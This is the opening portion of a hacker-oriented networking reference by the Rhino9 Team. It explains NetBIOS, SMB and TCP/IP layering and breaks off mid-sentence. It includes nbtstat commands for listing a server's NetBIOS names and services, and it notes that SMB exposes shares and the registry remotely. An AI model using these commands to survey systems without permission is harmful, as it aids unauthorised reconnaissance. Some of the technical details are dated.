[0.0.0] Preface

This book was written/compiled by The Rhino9 Team as a document for the modern hacker. We 
chose to call it the Modern Hackers Desk Reference because it mostly deals with Networking 
Technologies and Windows NT issues. Which, as everyone knows, is a must knowledge these 
days. Well, rhino9, as the premiere NT Security source, we have continually given to the security 
community freely. We continue this tradition now with this extremely useful book. This book 
covers WindowsNT security issues, Unix, Linux, Irix, Vax, Router configuration, Frontpage, 
Wingate and much much more.

[1.0.0] Preface to NetBIOS

Before you begin reading this section, understand that this section was written for the novice to 
the concept of NetBIOS, but - it also contains information the veteran might find educational. I am 
prefacing this so that I do not get e-mail like "Why did you start your NetBIOS section off so 
basic?" - Simple, its written for people that may be coming from an enviroment that does not use 
NetBIOS, so they would need me to start with basics, thanks.

[1.0.1] Whats is NetBIOS?

NetBIOS (Network Basic Input/Output System) was originally developed by IBM and Sytek as an 
Application Programming Interface (API) for client software to access LAN resources. Since its 
creation, NetBIOS has become the basis for many other networking applications. In its strictest 
sense, NetBIOS is an interface specification for acessing networking services.

NetBIOS, a layer of software developed to link a network operating system with specific 
hardware, was originally designed as THE network controller for IBM's Network LAN. NetBIOS 
has now been extended to allow programs written using the NetBIOS interface to operate on the 
IBM token ring architecture. NetBIOS has since been adopted as an industry standard and now, it 
is common to refer to NetBIOS-compatible LANs.

It offers network applications a set of "hooks" to carry out inter-application communication and 
data transfer. In a basic sense, NetBIOS allows applications to talk to the network. Its intention is 
to isolate application programs from any type of hardware dependancies. It also spares software 
developers the task of developing network error recovery and low level message addressing or 
routing. The use of the NetBIOS interface does alot of this work for them.

NetBIOS standardizes the interface between applications and a LANs operating capabilities. With 
this, it can be specified to which levels of the OSI model the application can write to, making the 
application transportable to other networks. In a NetBIOS LAN enviroment, computers are known 
on the system  by a name. Each computer on the network has a permanent name that is 
programmed in various different ways. These names will be discussed in more detail below.

PC's on a NetBIOS LAN communicate either by establishing a session or by using NetBIOS 
datagram or broadcast methods. Sessions allow for a larger message to be sent and handle error 
detection and correction. The communication is on a one-to-one basis.  Datagram and broadcast 
methods allow one computer to communicate with several other computers at the same time, but 
are limited in message size. There is no error detection or correction using these datagram or 
broadcast methods. However, datagram communication allows for communication without having 
to establish a session.

All communication in these enviroments are presented to NetBIOS in a format called Network 
Control Blocks (NCB). The allocation of these blocks in memory is dependant on the user 
program. These NCB's are divided into fields, these are reserved for input and output 
respectively.

NetBIOS is a very common protocol used in todays enviroments. NetBIOS is supported on 
Ethernet, TokenRing, and IBM PC Networks.  In its original induction, it was defined as only an 
interface between the application and the network adapter. Since then, transport like functions 
have been added to NetBIOS, making it more functional over time.

In NetBIOS, connection (TCP) oriented and connectionless (UDP) communication are both 
supported. It supports both broadcasts and multicasting and supports three distinct services: 
Naming, Session, and Datagram.

[1.0.2] NetBIOS Names

NetBIOS names are used to identify resources on a network. Applications use these names to 
start and end sessions. You can configure a single machine with multiple applications, each of 
which has a unique NetBIOS name. Each PC that supports an application  also has a NetBIOS 
station name that is user defined or that NetBIOS derives by internal means.

NetBIOS can consist of up to 16 alphanumeric characters. The combination of characters must 
be unique within  the entire source routing network. Before a PC that uses NetBIOS can fully 
function on a network, that PC must register their NetBIOS name. 

When a client becomes active, the client advertises their name. A client is considered to be 
registered when it can successfully advertise itself without any other client claiming it has the 
same name. The steps of the registration process is as follows:

1. Upon boot up, the client broadcasts itself and its NetBIOS information anywhere from 6 to 10 to 
ensure every other client on the network receives the information.

2. If another client on the network already has the name, that NetBIOS client issues its own 
broadcast to indicate that the name is in use. The client who is trying to register the already in use 
name, stop all attempts to register that name.

3. If no other client on the network objects to the name registration, the client will finish the 
registration process.

There are two types of names in a NetBIOS enviroment: Unique and Group. A unique name must 
be unique across the network. A group name does not have to be unique and all processes that 
have a given group name belong to the group. Each NetBIOS node maintains a table of all 
names currently owned by that node. 

The NetBIOS naming convention allows for 16 characters in a NetBIOS name. Microsoft, 
however, limits these names to 15 characters and uses the 16th character as a NetBIOS suffix. A 
NetBIOS suffix  is used by Microsoft Networking software to indentify the functionality installed or 
the registered device or service.

[QuickNote: SMB and NBT (NetBIOS over TCP/IP work very closely together and both use ports 
137, 138, 139. Port 137 is NetBIOS name UDP. Port 138 is NetBIOS datagram UDP. Port 139 is 
NetBIOS session TCP. For further information on NetBIOS, read the paper at the rhino9 website 
listed above]

The following is a table of NetBIOS suffixes currently used by Microsoft WindowsNT. These 
suffixes are displayed in hexadecimal format.

Unique (U): The name may have only one IP address assigned to it. On a network device, 
multiple occurences of a single name may appear to be registered, but the suffix will be unique, 
making the entire name unique.

Group (G): A normal group; the single name may exist with many IP addresses. 

Multihomed (M): The name is unique, but due to multiple network interfaces on the same 
computer, this configuration is necessary to permit the registration. Maximum number of 
addresses is 25.

Internet Group (I): This is a special configuration of the group name used to manage WinNT 
domain names.

Domain Name (D): New in NT 4.0

For a quick and dirty look at a servers registered NetBIOS names and services, issue the 
following NBTSTAT command:

nbtstat -A [ipaddress]
nbtstat –a [host]

[1.0.3] NetBIOS Sessions

The NetBIOS session service provides a connection-oriented, reliable, full-duplex message 
service to a user process. NetBIOS requires one process to be the client and the other to be the 
server. NetBIOS session establishment requires a preordained cooperation between the two 
stations. One application must have issued a Listen command when another application issues a 
Call command. The Listen command references a name in its NetBIOS name table (or WINS 
server), and also the remote name an application must use to qualify as a session partner.  If the 
receiver (listener) is not already listening, the Call will be unsuccessful. If the call is successful, 
each application receives notification of session establishment with the session-id. The Send and 
Receive commands the transfer data. At the end of a session, either application can issue a 
Hang-Up command. There is no real flow control for the session service because it is assumed a 
LAN is fast enough to carry the required traffic.

[1.0.4] NetBIOS Datagrams

Datagrams  can be sent to a specific name, sent to all members of a group, or broadcast to the 
entire LAN. As with other datagram services, the NetBIOS datagrams are connectionless and 
unreliable. The Send_Datagram command requires the caller to specify the name of the 
destination. If the destination is a group name, then every member of the group receives the 
datagram. The caller of the Receive_Datagram command must specify the local name for which it 
wants to receive datagrams. The Receive_Datagram command also returns the name of the 
sender, in addition to the actual datagram data. If NetBIOS receives a datagram, but there are no 
Receive_Datagram commands pending, then the datagram is discarded. 

The Send_Broadcast_Datagram command sends the message to every NetBIOS system on the 
local network. When a broadcast datagram is received by a NetBIOS node, every process that 
has issued a Receive_Broadcast_Datagram command receives the datagram. If none of these 
commands are outstanding when the broadcast datagram is received, the datagram is discarded.

NetBIOS enables an application to establish a session with another device and lets the network 
redirector and transaction protocols pass a request to and from another machine. NetBIOS does 
not actually manipulate the data. The NetBIOS specification defines an interface to the network 
protocol used to reach those services, not the protocol itself. Historically, has been paired with a 
network protocol called NetBEUI (network extended user interface). The association of the 
interface and the protocol has sometimes caused confusion, but the two are different.

Network protocols always provide at least one method for locating and connecting to a particular 
service on a network. This is usually accomplished by converting a node or service name to a 
network address (name resolution). NetBIOS service names must be resolved to an IP address 
before connections can be established with TCP/IP. Most NetBIOS implementations for TCP/IP 
accomplish name address resolution by using either broadcast or LMHOSTS files. In a Microsoft 
enviroment, you would probably also use a NetBIOS Namer Server known as WINS.

[1.0.5] NetBEUI Explained

NetBEUI is an enhanced version of the NetBIOS protocol used by network operating systems. It 
formalizes the transport frame that was never standardized in NetBIOS and adds additional 
functions. The transport layer driver frequently used by Microsofts LAN Manager. NetBEUI 
implements the OSI LLC2 protocol.  NetBEUI is the original PC networking protocol and interface 
designed by IBM for the LanManger Server. This protocol was later adopted by Microsoft for their 
networking products. It specifies the way that higher level software sends and receives messages 
over the NetBIOS frame protocol. This protocol runs over the standard 802.2 data-link protocol 
layer.

[1.0.6] NetBIOS Scopes

A NetBIOS Scope ID provides an extended naming service for the NetBIOS over TCP/IP (Known 
as NBT) module. The primary purpose of a NetBIOS scope ID is to isolate NetBIOS traffic on a 
single network to only those nodes with the same NetBIOS scope ID. The NetBIOS scope ID is a 
character string that is appended to the NetBIOS name. The NetBIOS scope ID on two hosts 
must match, or the two hosts will not be able to communicate. The NetBIOS Scope ID also allows 
computers to use the same computer namee as they have different scope IDs. The Scope ID 
becomes a part of the NetBIOS name, making the name unique.

[1.2.0] Preface to SMB’s

The reason I decided to write this section was because recently the rhino9 team has been giving 
speeches and lectures. The two questions we most frequently come across is "What is 
NetBIOS?" and "What are SMBs?". Well I hope I have already answered the NetBIOS question 
with the section above. This particular section is being written to better help people understand 
SMB's. 

[1.2.1] What are SMB's?

Server Message Blocks are a type of "messaging protocol" that LAN Manager (and NT) clients 
and servers use to communicate with each other. SMB's are a higher level protocol that can be 
transported over NetBEUI, NetBIOS over IPX, and NetBIOS over TCP/IP (or NBT).

SMBs are used by Windows 3.X, Win95, WintNT and OS/2. When it comes to security and the 
compromise of security on an NT network, the one thing to remember about SMBs is that it 
allows for remote access to shared directories, the registry, and other system services, making it 
a deadly protocol in the eyes of security conscience people.

The SMB protocol was originally developed by IBM, and then jointly developed by Microsoft and 
IBM. Network requests that are sent using SMB's are encoded as Network Control Blocks (NCB) 
data structures. The NCB data structures are encoded in SMB format for transmission across the 
network. SMB is used in many Microsoft and IBM networking software:

? MS-Net
? IBM PC Network
? IBM LAN Server
? MS LAN Manager
? LAN Manager for Unix
? DEC Pathworks
? MS Windows for Workgroups
? Ungermann-Bass Net/1
? NT Networks through support for LAN Manager

SMB Messages can be categorized into four types:

Session Control: Used to establish or discontinue Redirector connections with a remote network 
resource such as a directory or printer. (The redirector is explained below)

File: Used to access and manipulate file system resources on the remote computer.

Printer: Used by the Redirector to send print data to a remote printer or queue, and to obtain the 
status of remote print devices.

Message: Used by applications and system components to send unicast or broadcast messages.

[1.2.2] The Redirector

The Redirector is the component that enables a client computer to gain access to resources on 
another computer as if the remote resources were local to the client computer. The Redirector 
communicates with other computers using the protocol stack.

The Redirectors primary function is to format remote requests so that they can be understood by 
a remote station (such as a file server) and send them on their way through the network.

The Redirector uses the Server Message Block (SMB) structure as the standard vehicle for 
sending these requests. The SMB is also the vehicle by which stations return responses to 
Redirector requests.

Each SMB contains a header consisting of the command code (which specifies the task that the 
redirector wants the remote station to perform) and several environment and parameter fields 
(which specify how the command should be carried out).

In addition to the header, the last field in the SMB may contain up to 64K of data to be sent to the 
remote station.

[2.0.0] What is TCP/IP?

TCP/IP is a set of protocols developed to allow cooperating computers to share resources across 
a network. It was developed by a community of researchers centered around the ARPAnet 
(Advanced Research Projects Agency). Certainly the ARPAnet is the best-known TCP/IP 
network. However as of June, 87, at least 130 different vendors had products that support 
TCP/IP, and thousands of networks of all kinds use it. 

First some basic definitions. The most accurate name for the set of protocols we are describing is 
the "Internet protocol suite". TCP and IP are two of the protocols in this suite. (They will be 
described below.) Because TCP and IP are the best known of the protocols, it has become 
common to use the term TCP/IP to refer to the whole family. 

The Internet is a collection of networks, including the Arpanet, NSFnet, regional networks such as 
NYsernet, local networks at a number of University and research institutions, and a number of 
military networks and a growing number of private corporation owned networks. The term 
"Internet" applies to this entire set of networks. The subset of them that is managed by the 
Department of Defense is referred to as the "DDN" (Defense Data Network). This includes some 
research-oriented networks, such as the Arpanet, as well as more strictly military ones. All of 
these networks are connected to each other. Users can send messages from any of them to any 
other, except where there are security or other policy restrictions on access. 

Officially speaking, the Internet protocol documents are simply standards adopted by the Internet 
community for its own use. More recently, the Department of Defense issued a MILSPEC 
definition of
TCP/IP. This was intended to be a more formal definition, appropriate for use in purchasing 
specifications. However most of the TCP/IP community continues to use the Internet standards. 
The MILSPEC version is intended to be consistent with it.

Whatever it is called, TCP/IP is a family of protocols. A few provide "low-level" functions needed 
for many applications. These include IP, TCP, and UDP. (These will be described in a bit more 
detail later.)
Others are protocols for doing specific tasks, e.g. transferring files between computers, sending 
mail, or finding out who is logged in on another computer. Initially TCP/IP was used mostly 
between
minicomputers or mainframes. These machines had their own disks, and generally were self-
contained. Thus the most important "traditional" TCP/IP services are:

[2.0.1] File Transfer
    The file transfer protocol (FTP) allows a user on any computer
to get files from another computer, or to send files to another
computer. Security is handled by requiring the user to specify a user
name and password for the other computer, or logging into a system that
allows for Anonymous logins. Provisions are made for
handling file transfer between machines with different character set,
end of line conventions, etc. This is not quite the same thing as more
recent "network file system" or "NetBIOS" protocols, which will be
described below. Rather, FTP is a utility that you run any time you
want to access a file on another system. You use it to copy the file
to your own system. You then work with the local copy. (See RFC 959
for specifications for FTP.)  

[2.0.2] Remote Login 
    The network terminal protocol (TELNET) allows a user to log in
on any other computer on the network. You start a remote session by
specifying a computer to connect to. From that time until you finish
the session, anything you type is sent to the other computer. Note
that you are really still talking to your own computer. But the telnet
program effectively makes your computer invisible while it is
running. Every character you type is sent directly to the other
system. Generally, the connection to the remote computer behaves much
like a dialup connection. That is, the remote system will ask you to
log in and give a password, in whatever manner it would normally ask a
user who had just dialed it up. When you log off of the other
computer, the telnet program exits, and you will find yourself talking
to your own computer. Microcomputer implementations of telnet
generally include a terminal emulator for some common type of
terminal. (See RFC's 854 and 855 for specifications for telnet. By the
way, the telnet protocol should not be confused with Telenet, a vendor
of commercial network services.)

[2.0.3] Computer Mail
    This allows you to send messages to users on other
computers. Originally, people tended to use only one or two specific
computers. They would maintain "mail files" on those machines. The
computer mail system is simply a way for you to add a message to
another user's mail file. There are some problems with this in an
environment where microcomputers are used. The most serious is that a
micro is not well suited to receive computer mail. When you send mail,
the mail software expects to be able to open a connection to the
addressee's computer, in order to send the mail. If this is a
microcomputer, it may be turned off, or it may be running an
application other than the mail system. For this reason, mail is
normally handled by a larger system, where it is practical to have a
mail server running all the time. Microcomputer mail software then
becomes a user interface that retrieves mail from the mail
server. (See RFC 821 and 822 for specifications for computer mail. See
RFC 937 for a protocol designed for microcomputers to use in reading
mail from a mail server.)

These services should be present in any implementation of TCP/IP, except that micro-oriented 
implementations may not support computer mail. These traditional applications still play a very 
important role in TCP/IP-based networks. However more recently, the way in which networks are 
used has been changing. The older model of a number of large, self-sufficient computers is 
beginning to change. Now many installations have several kinds of computers, including 
microcomputers, workstations, minicomputers, and mainframes. These computers are likely to be 
configured to perform specialized
tasks. Although people are still likely to work with one specific computer, that computer will call on 
other systems on the net for specialized services. This has led to the "server/client" model of 
network services. A server is a system that provides a specific service for the rest of the network. 
A client is another system that uses that service. (Note that the server and client need not be on 
different computers. They could be different programs running on the same computer.)

Here are the kinds of servers typically present in a modern computer setup. Note that these 
computer services can all be provided within the framework of TCP/IP.

[2.0.4] Network File Systems
    This allows a system to access files on another computer in a
somewhat more closely integrated fashion than FTP. A network file
system provides the illusion that disks or other devices from one
system are directly connected to other systems. There is no need to
use a special network utility to access a file on another system. Your
computer simply thinks it has some extra disk drives. These extra
"virtual" drives refer to the other system's disks. This capability is
useful for several different purposes. It lets you put large disks on
a few computers, but still give others access to the disk space. Aside
from the obvious economic benefits, this allows people working on
several computers to share common files. It makes system maintenance
and backup easier, because you don't have to worry about updating and
backing up copies on lots of different machines. A number of vendors
now offer high-performance diskless computers. These computers have no
disk drives at all. They are entirely dependent upon disks attached to
common "file servers". (See RFC's 1001 and 1002 for a description of
PC-oriented NetBIOS over TCP. In the workstation and minicomputer
area, Sun's Network File System is more likely to be used. Protocol
specifications for it are available from Sun Microsystems.)

[2.0.5] Remote Printing
    This allows you to access printers on other computers as if
they were directly attached to yours. (The most commonly used protocol
is the remote lineprinter protocol from Berkeley Unix. Unfortunately,
there is no protocol document for this. However the C code is easily
obtained from Berkeley, so implementations are common.)

[2.0.6] Remote Execution
    This allows you to request that a particular program be run on
a different computer. This is useful when you can do most of your work
on a small computer, but a few tasks require the resources of a larger
system. There are a number of different kinds of remote execution.
Some operate on a command by command basis. That is, you request that
a specific command or set of commands should run on some specific
computer. (More sophisticated versions will choose a system that
happens to be free.) However there are also "remote procedure call"
systems that allow a program to call a subroutine that will run on
another computer. (There are many protocols of this sort. Berkeley
Unix contains two servers to execute commands remotely: rsh and
rexec. The man pages describe the protocols that they use. The
user-contributed software with Berkeley 4.3 contains a "distributed
shell" that will distribute tasks among a set of systems, depending
upon load. Remote procedure call mechanisms have been a topic for
research for a number of years, so many organizations have
implementations of such facilities. The most widespread
commercially-supported remote procedure call protocols seem to be
Xerox's Courier and Sun's RPC. Protocol documents are available from
Xerox and Sun. There is a public implementation of Courier over TCP as
part of the user-contributed software with Berkeley 4.3. An
implementation of RPC was posted to Usenet by Sun, and also appears as
part of the user-contributed software with Berkeley 4.3.)

[2.0.7] Name Servers
    In large installations, there are a number of different
collections of names that have to be managed. This includes users and
their passwords, names and network addresses for computers, and
accounts. It becomes very tedious to keep this data up to date on all
of the computers. Thus the databases are kept on a small number of
systems. Other systems access the data over the network. (RFC 822 and
823 describe the name server protocol used to keep track of host names
and Internet addresses on the Internet. This is now a required part of
any TCP/IP implementation. IEN 116 describes an older name server
protocol that is used by a few terminal servers and other products to
look up host names. Sun's Yellow Pages system is designed as a general
mechanism to handle user names, file sharing groups, and other
databases commonly used by Unix systems. It is widely available
commercially. Its protocol definition is available from Sun.)

[2.0.8] Terminal Servers
    Many installations no longer connect terminals directly to
computers. Instead they connect them to terminal servers. A terminal
server is simply a small computer that only knows how to run telnet
(or some other protocol to do remote login). If your terminal is
connected to one of these, you simply type the name of a computer, and
you are connected to it. Generally it is possible to have active
connections to more than one computer at the same time. The terminal
server will have provisions to switch between connections rapidly, and
to notify you when output is waiting for another connection. (Terminal
servers use the telnet protocol, already mentioned. However any real
terminal server will also have to support name service and a number of
other protocols.)

[2.0.9] Network-Oriented Window Systems
    Until recently, high- performance graphics programs had to
execute on a computer that had a bit-mapped graphics screen directly
attached to it. Network window systems allow a program to use a
display on a different computer. Full-scale network window systems
provide an interface that lets you distribute jobs to the systems that
are best suited to handle them, but still give you a single
graphically-based user interface. (The most widely-implemented window
system is X. A protocol description is available from MIT's Project
Athena. A reference implementation is publicly available from MIT. A
number of vendors are also supporting NeWS, a window system defined by
Sun. Both of these systems are designed to use TCP/IP.)

Note that some of the protocols described above were designed by Berkeley, Sun, or other 
organizations. Thus they are not officially part of the Internet protocol suite. However they are 
implemented
using TCP/IP, just as normal TCP/IP application protocols are. Since the protocol definitions are 
not considered proprietary, and since commercially-support implementations are widely available, 
it is
reasonable to think of these protocols as being effectively part of the Internet suite.

Also note that the list above is simply a sample of the sort of services available through TCP/IP. 
However it does contain the majority of the "major" applications. The other commonly-used 
protocols tend to be
specialized facilities for getting information of various kinds, such as who is logged in, the time of 
day, etc. However if you need a facility that is not listed here, we encourage you to look through 
the current edition of Internet Protocols (currently RFC 1011), which lists all of the available 
protocols, and also to look at some of the major TCP/IP implementations to see what various 
vendors have added.

[2.1.0] General description of the TCP/IP protocols

TCP/IP is a layered set of protocols. In order to understand what this means, it is useful to look at 
an example. A typical situation is sending mail. First, there is a protocol for mail. This defines a 
set of commands which one machine sends to another, e.g. commands to specify who the sender 
of the message is, who it is being sent to, and then the text of the message. However this 
protocol assumes that there is a way to communicate reliably between the two computers. Mail, 
like other application protocols, simply defines a set of commands and messages to be sent. It is 
designed to be used together with TCP and IP.

TCP is responsible for making sure that the commands get through to the other end. It keeps 
track of what is sent, and retransmits anything that did not get through. If any message is too 
large for one
datagram, e.g. the text of the mail, TCP will split it up into several datagrams, and make sure that 
they all arrive correctly. Since these functions are needed for many applications, they are put 
together into
a separate protocol, rather than being part of the specifications for sending mail. You can think of 
TCP as forming a library of routines that applications can use when they need reliable network
communications with another computer.

Similarly, TCP calls on the services of IP. Although the services that TCP supplies are needed by 
many applications, there are still some kinds of applications that don't need them. However there 
are some
services that every application needs. So these services are put together into IP. As with TCP, 
you can think of IP as a library of routines that TCP calls on, but which is also available to 
applications that don't use TCP. This strategy of building several levels of protocol is called 
"layering". We think of the applications programs such as mail, TCP, and IP, as being separate 
"layers", each of which calls on the services of the layer below it. Generally, TCP/IP applications 
use 4 layers: an application protocol such as mail, a protocol such as TCP that provides services 
need by many applications IP, which provides the basic service of getting datagrams to their 
destination the  protocols needed to manage a specific physical medium, such as Ethernet or a 
point to point line.

TCP/IP is based on the "catenet model". (This is described in more detail in IEN 48.) This model 
assumes that there are a large number of independent networks connected together by 
gateways. The user should be able to access computers or other resources on any of these 
networks. Datagrams will often pass through a dozen different networks before getting to their 
final destination.

The routing needed to accomplish this should be completely invisible to the user. As far as the 
user is concerned, all he needs to know in order to access another system is an "Internet 
address". This is an
address that looks like 128.6.4.194. It is actually a 32-bit number. However it is normally written 
as 4 decimal numbers, each representing 8 bits of the address. (The term "octet" is used by 
Internet documentation for such 8-bit chunks. The term "byte" is not used, because TCP/IP is 
supported by some computers that have byte sizes other than 8 bits.) Generally the structure of 
the address gives
you some information about how to get to the system. For example, 128.6 is a network number 
assigned by a central authority to Rutgers University. Rutgers uses the next octet to indicate 
which of the
campus Ethernets is involved. 128.6.4 happens to be an Ethernet used by the Computer Science 
Department. The last octet allows for up to 254 systems on each Ethernet. (It is 254 because 0 
and 255 are not allowed, for reasons that will be discussed later.) Note that 128.6.4.194 and 
128.6.5.194 would be different systems. The structure of an Internet address is described in a bit 
more detail later.

Of course we normally refer to systems by name, rather than by Internet address. When we 
specify a name, the network software looks it up in a database, and comes up with the 
corresponding Internet
address. 

Most of the network software deals strictly in terms of the address. (RFC 882 describes the name 
server technology used to handle this lookup.)  TCP/IP is built on "connectionless" technology. 
Information is transferred as a sequence of "datagrams". A datagram is a collection of data that is 
sent as a single
message. Each of these datagrams is sent through the network individually. There are provisions 
to open connections (i.e. to start a conversation that will continue for some time). However at 
some level, information from those connections is broken up into datagrams, and those 
datagrams are treated by the network as completely separate.

For example, suppose you want to transfer a 15000 octet file. Most networks can't handle a 
15000 octet datagram. So the protocols will break this up into something like 30 500-octet 
datagrams. Each of these datagrams will be sent to the other end. At that point, they will be put 
back together into the 15000-octet
file. However while those datagrams are in transit, the network doesn't know that there is any 
connection between them. It is perfectly possible that datagram 14 will actually arrive before 
datagram 13. It is also possible that somewhere in the network, an error will occur, and some 
datagram won't get through at all. In that case, that datagram has to be sent again.

Note by the way that the terms "datagram" and "packet" often seem to be nearly interchangable. 
Technically, datagram is the right word to use when describing TCP/IP. A datagram is a unit of 
data, which is what the protocols deal with. A packet is a physical thing, appearing on an Ethernet 
or some wire. In most cases a packet simply contains a datagram, so there is very little 
difference. However they can differ. When TCP/IP is used on top of X.25, the X.25 interface 
breaks the datagrams up into 128-byte packets. This is invisible to IP, because the packets are 
put back together into a single datagram at
the other end before being processed by TCP/IP. So in this case, one IP datagram would be 
carried by several packets. However with most media, there are efficiency advantages to sending 
one datagram per
packet, and so the distinction tends to vanish.

[2.1.1] The TCP Level

Two separate protocols are involved in handling TCP/IP datagrams. TCP (the "transmission 
control protocol") is responsible for breaking up the message into datagrams, reassembling them 
at the other end, resending anything that gets lost, and putting things back in the right order. IP 
(the "internet protocol") is responsible for routing individual datagrams. It may seem like TCP is 
doing all the work. And
in small networks that is true. However in the Internet, simply getting a datagram to its destination 
can be a complex job. A connection may require the datagram to go through several networks at 
Rutgers, a serial line to the John von Neuman Supercomputer Center, a couple of Ethernets 
there, a series of 56Kbaud phone lines to another NSFnet site, and more Ethernets on another 
campus. Keeping track of
the routes to all of the destinations and handling incompatibilities among different transport media 
turns out to be a complex job.

Note that the interface between TCP and IP is fairly simple. TCP simply hands IP a datagram with 
a destination. IP doesn't know how this datagram relates to any datagram before it or after it.  It 
may
have occurred to you that something is missing here. We have talked about Internet addresses, 
but not about how you keep track of multiple connections to a given system. Clearly it isn't 
enough to get a
datagram to the right destination. TCP has to know which connection this datagram is part of.

This task is referred to as "demultiplexing." In fact, there are several levels of demultiplexing 
going on in TCP/IP. The information needed to do this demultiplexing is contained in a series of 
"headers". A header is simply a few extra octets tacked onto the beginning of a datagram by 
some protocol in order to keep track of it. It's a lot like putting a letter into an envelope and putting 
an address on the outside of the envelope. Except with modern networks it happens several 
times. It's like you put the letter into a little
envelope, your secretary puts that into a somewhat bigger envelope, the campus mail center puts 
that envelope into a still bigger one, etc.

Here is an overview of the headers that get stuck on a message that passes through a typical 
TCP/IP network: 

We start with a single data stream, say a file you are trying to send to some other computer:

TCP breaks it up into manageable chunks. (In order to do this, TCP has to know how large a 
datagram your network can handle. Actually, the TCP's at each end say how big a datagram they 
can handle, and then they pick the smallest size.)  

TCP puts a header at the front of each datagram. This header actually contains at least 20 octets, 
but the most important ones are a source and destination "port number" and a "sequence 
number". The port
numbers are used to keep track of different conversations. Suppose 3 different people are 
transferring files. Your TCP might allocate port numbers 1000, 1001, and 1002 to these transfers. 
When you are sending a datagram, this becomes the "source" port number, since you are the 
source of the datagram. Of course the TCP at the other end has assigned a port number of its 
own for the conversation. Your TCP has to know the port number used by the other end as well. 
(It finds out when the connection starts, as we will explain below.) It puts this in the "destination" 
port field. Of course if the other end sends a
datagram back to you, the source and destination port numbers will be reversed, since then it will 
be the source and you will be the destination.

Each datagram has a sequence number. This is used so that the other end can make sure that it 
gets the datagrams in the right order, and that it hasn't missed any. (See the TCP specification for
details.) TCP doesn't number the datagrams, but the octets. So if there are 500 octets of data in 
each datagram, the first datagram might be numbered 0, the second 500, the next 1000, the next 
1500,
etc.

Finally, I will mention the Checksum. This is a number that is computed by adding up all the 
octets in the datagram (more or less - see the TCP spec). The result is put in the header. TCP at 
the other end computes the checksum again. If they disagree, then something bad happened to 
the datagram in transmission, and it is thrown away. 

The window is used to control how much data can be in transit at any one time. It is not practical 
to wait for each datagram to be acknowledged before sending the next one. That would slow 
things down
too much. On the other hand, you can't just keep sending, or a fast computer might overrun the 
capacity of a slow one to absorb data. Thus each end indicates how much new data it is currently 
prepared to
absorb by putting the number of octets in its "Window" field. As the computer receives data, the 
amount of space left in its window decreases. When it goes to zero, the sender has to stop. As 
the receiver processes the data, it increases its window, indicating that it is ready to accept more 
data. Often the same datagram can be used to acknowledge receipt of a set of data and to give 
permission for
additional new data (by an updated window).

The "Urgent" field allows one end to tell the other to skip ahead in its processing to a particular 
octet. This is often useful for handling asynchronous events, for example when you type a control 
character or other command that interrupts output. The other fields are beyond the scope of this 
document.

[2.1.2] The IP level

TCP sends each of these datagrams to IP. Of course it has to tell IP the Internet address of the 
computer at the other end. Note that this is all IP is concerned about. It doesn't care about what is 
in the
datagram, or even in the TCP header. IP's job is simply to find a route for the datagram and get it 
to the other end. In order to allow gateways or other intermediate systems to forward the 
datagram, it
adds its own header.

The main things in this header are the source and destination Internet address (32-bit addresses, 
like 128.6.4.194), the protocol number, and another checksum. The source Internet address is 
simply the address of your machine. (This is necessary so the other end knows where the 
datagram came from.) The destination Internet address is the address of the other machine. (This 
is necessary so any gateways in the middle know where you want the datagram to go.) The 
protocol number tells IP at the other end to send the datagram to TCP. Although most IP traffic 
uses TCP, there are other protocols that can use IP, so you have to tell IP which protocol to send 
the datagram to.

Finally, the checksum allows IP at the other end to verify that the header wasn't damaged in 
transit. Note that TCP and IP have separate checksums. IP needs to be able to verify that the 
header didn't get
damaged in transit, or it could send a message to the wrong place. For reasons not worth 
discussing here, it is both more efficient and safer to have TCP compute a separate checksum for 
the TCP header and data. 

Again, the header contains some additional fields that have not been discussed. Most of them are 
beyond the scope of this document. The flags and fragment offset are used to keep track of the 
pieces when a
datagram has to be split up. This can happen when datagrams are forwarded through a network 
for which they are too big. (This will be discussed a bit more below.) The time to live is a number 
that is
decremented whenever the datagram passes through a system. When it goes to zero, the 
datagram is discarded. This is done in case a loop develops in the system somehow. Of course 
this should be impossible, but well-designed networks are built to cope with "impossible" 
conditions.

At this point, it's possible that no more headers are needed. If your computer happens to have a 
direct phone line connecting it to the destination computer, or to a gateway, it may simply send 
the
datagrams out on the line (though likely a synchronous protocol such as HDLC would be used, 
and it would add at least a few octets at the beginning and end).

[2.1.3] The Ethernet level

Most of our networks these days use Ethernet. So now we have to describe Ethernet's headers. 
Unfortunately, Ethernet has its own addresses. The people who designed Ethernet wanted to 
make sure that no two machines would end up with the same Ethernet address. Furthermore, 
they didn't want the user to have to worry about assigning addresses. So each Ethernet controller 
comes with an address
builtin from the factory. In order to make sure that they would never have to reuse addresses, the 
Ethernet designers allocated 48 bits for the Ethernet address. People who make Ethernet 
equipment have to
register with a central authority, to make sure that the numbers they assign don't overlap any 
other manufacturer.

Ethernet is a "broadcast medium". That is, it is in effect like an old party line telephone. When you 
send a packet out on the Ethernet, every machine on the network sees the packet. So something 
is needed
to make sure that the right machine gets it. As you might guess, this involves the Ethernet 
header. Every Ethernet packet has a 14-octet header that includes the source and destination 
Ethernet address, and
a type code. Each machine is supposed to pay attention only to packets with its own Ethernet 
address in the destination field. (It's perfectly possible to cheat, which is one reason that Ethernet 
communications are not terribly secure.)

Note that there is no connection between the Ethernet address and the Internet address. Each 
machine has to have a table of what Ethernet address corresponds to what Internet address. (We 
will describe how
this table is constructed a bit later.)  In addition to the addresses, the header contains a type 
code. The type code is to allow for several different protocol families to be used on the same 
network. So you can
use TCP/IP, DECnet, Xerox NS, etc. at the same time. Each of them will put a different value in 
the type field. Finally, there is a checksum. The Ethernet controller computes a checksum of the 
entire
packet. When the other end receives the packet, it recomputes the checksum, and throws the 
packet away if the answer disagrees with the original. The checksum is put on the end of the 
packet, not in the
header. 

When these packets are received by the other end, of course all the headers are removed. The 
Ethernet interface removes the Ethernet header and the checksum. It looks at the type code. 
Since the type
code is the one assigned to IP, the Ethernet device driver passes the datagram up to IP. IP 
removes the IP header. It looks at the IP protocol field. Since the protocol type is TCP, it passes 
the datagram
up to TCP. TCP now looks at the sequence number. It uses the sequence numbers and other 
information to combine all the datagrams into the original file.  The ends our initial summary of 
TCP/IP. There are
still some crucial concepts we haven't gotten to, so we'll now go back and add details in several 
areas. (For detailed descriptions of the items discussed here see, RFC 793 for TCP, RFC 791 for 
IP, and RFC's
894 and 826 for sending IP over Ethernet.)

[2.1.4] Well-Known Sockets And The Applications Layer

So far, we have described how a stream of data is broken up into datagrams, sent to another 
computer, and put back together. However something more is needed in order to accomplish 
anything useful. There
has to be a way for you to open a connection to a specified computer, log into it, tell it what file 
